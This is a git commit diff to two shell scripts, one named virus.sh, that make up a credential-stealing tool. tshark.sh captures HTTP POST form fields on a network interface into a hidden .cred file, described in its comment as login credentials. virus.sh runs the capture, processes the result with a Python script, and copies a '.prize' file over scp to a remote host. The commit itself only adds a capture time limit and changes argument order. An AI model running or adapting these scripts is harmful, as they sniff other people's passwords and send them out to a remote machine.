68af0330a40274aad3f6390c2bf8500f37ea4e0d
Charles <chlsgong@gmail.com>
2018-04-16 17:22:59 -0500

    added stop condition tshark

--- tshark.sh
+++ tshark.sh
@@ -4,4 +4,4 @@
 sudo apt-get install tshark
 
 # listen for packets and pipe login credentials to file
-tshark -i eth0 -Y 'http.request.method == POST' -T fields -e urlencoded-form.key -e urlencoded-form.value > .cred
+tshark -a duration:$1 -i eth0 -Y 'http.request.method == POST' -T fields -e urlencoded-form.key -e urlencoded-form.value > .cred
--- virus.sh
+++ virus.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 
 # run tshark script
-./tshark.sh
+./tshark.sh $1
 
 # run python script
 python project.py .cred
 
 # send prize over ssh
-scp -i id_rsa .prize hcgong@$1:~/Documents
+scp -i id_rsa .prize hcgong@$2:~/Documents
